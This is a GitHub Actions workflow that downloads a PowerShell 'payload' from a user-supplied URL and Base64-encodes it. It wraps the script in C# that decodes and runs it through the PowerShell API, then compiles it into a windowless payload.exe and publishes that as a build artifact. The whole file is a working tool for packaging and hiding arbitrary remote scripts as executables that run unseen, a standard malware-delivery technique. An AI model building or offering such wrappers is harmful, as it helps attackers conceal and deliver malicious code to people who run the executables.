name: Build PowerShell EXE using C# method

on:
  workflow_dispatch:
    inputs:
      payload_url:
        description: 'URL to fetch payload'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout code
      uses: actions/checkout@v3

    - name: Fetch Payload from URL
      run: |
        $url = '${{ github.event.inputs.payload_url }}'
        Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'

    - name: Convert PowerShell script to Base64
      run: |
        $script = Get-Content -Path 'payload.ps1' -Raw
        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script))
        Set-Content -Path 'base64_payload.txt' -Value $b64

    - name: Generate C# code
      shell: powershell
      run: |
        $b64 = Get-Content -Path 'base64_payload.txt' -Raw
        $csharp_code = @"
        using System;
        using System.Management.Automation;
        using System.Text;

        class Program {
        static void Main() {
        string b64 = ""{B64_PLACEHOLDER}"";
        string script = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
        using (PowerShell ps = PowerShell.Create()) {
            ps.AddScript(script);
            ps.Invoke();
        }
        }
        }
        "@ -replace "{B64_PLACEHOLDER}", $b64

        Set-Content -Path 'Program.cs' -Value $csharp_code

    - name: Compile C# code into EXE
      run: |
        & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:winexe /out:payload.exe Program.cs

    - name: Upload executable
      uses: actions/upload-artifact@v4
      with:
        name: payload_exe
        path: payload.exe
